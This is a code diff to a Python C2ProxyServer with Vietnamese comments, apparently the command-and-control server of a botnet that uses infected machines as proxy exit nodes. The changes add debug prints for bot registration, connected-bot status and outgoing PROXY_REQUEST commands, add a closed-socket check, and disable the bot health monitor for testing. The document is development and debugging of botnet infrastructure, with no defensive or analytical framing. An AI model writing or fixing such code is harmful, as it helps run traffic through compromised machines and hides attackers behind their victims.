@@ -331,6 +331,7 @@ class C2ProxyServer:
                 'successful_requests': 0,
                 'failed_requests': 0
             }
+            print(f"🔗 Bot {bot_id} registered as exit node with status: active")
 
             # Đăng ký bot vào load balancer
             self.load_balancer.register_bot(bot_id, {
@@ -539,6 +540,11 @@ class C2ProxyServer:
                 print(f"   📊 Available bots: {len(self.bot_exit_nodes)}")
                 for bot_id, bot_info in self.bot_exit_nodes.items():
                     print(f"   🤖 {bot_id}: status={bot_info.get('status', 'unknown')}, health={bot_info.get('health_score', 0)}")
+                
+                # Debug: Show connected bots status
+                print(f"   📊 Connected bots: {len(self.connected_bots)}")
+                for bot_id, bot_info in self.connected_bots.items():
+                    print(f"   🤖 {bot_id}: status={bot_info.get('status', 'unknown')}, last_seen={bot_info.get('last_seen', 'unknown')}")
                 
                 # Fallback: Use round-robin from connected bots
                 if self.connected_bots:
@@ -831,6 +837,7 @@ class C2ProxyServer:
             
             # Tạo command để gửi đến bot (framed protocol)
             command = f"PROXY_REQUEST:{connection_id}:{connection['target_host']}:{connection['target_port']}:{str(connection['is_https']).lower()}\n"
+            print(f"📤 Sending to bot {bot_id}: {command.strip()}")
             bot_socket.sendall(command.encode())
 
             # Gửi frame DATA đầu tiên (nếu là HTTP)
@@ -877,6 +884,11 @@ class C2ProxyServer:
 
     def _send_data_frame_to_bot(self, bot_socket, connection_id, payload_bytes):
         try:
+            # Check if socket is still valid
+            if bot_socket.fileno() == -1:
+                print(f"⚠️  Bot socket closed for connection {connection_id}")
+                return
+                
             header = f"DATA:{connection_id}:\n".encode()
             bot_socket.sendall(header + payload_bytes)
         except Exception as e:
@@ -1155,7 +1167,10 @@ class BotHealthMonitor:
         self.health_check_interval = 30
         
     def check_bot_health(self, connected_bots, bot_exit_nodes):
-        """Kiểm tra sức khỏe bot"""
+        """Kiểm tra sức khỏe bot - TẠM THỜI TẮT"""
+        # Tạm thời tắt health check để test
+        return
+        
         current_time = datetime.now()
         
         for bot_id, bot_info in connected_bots.items():
